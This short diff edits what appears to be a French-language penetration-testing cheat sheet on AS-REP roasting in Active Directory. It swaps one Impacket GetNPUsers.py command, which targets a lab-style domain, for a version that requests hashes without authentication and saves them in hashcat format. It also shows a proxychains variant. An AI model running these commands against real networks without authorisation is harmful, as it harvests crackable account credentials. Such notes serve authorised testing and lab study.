@@ -18,7 +18,8 @@ GetNPUsers.py "$DOMAIN/" -dc-ip $TARGET -request -outputfile ASREProastables.txt
 
 
 # Sans authentification
-GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
+GetNPUsers.py -usersfile users-valid.txt -dc-ip $TARGET -dc-host $DC_HOST $DOMAIN/ -outputfile asreproastable.txt -format hashcat
+
 proxychains -q GetNPUsers.py -hashes "$PASSWORD" -dc-ip "$DC" "$DOMAIN/$USER" -debug
 
 # Powerview
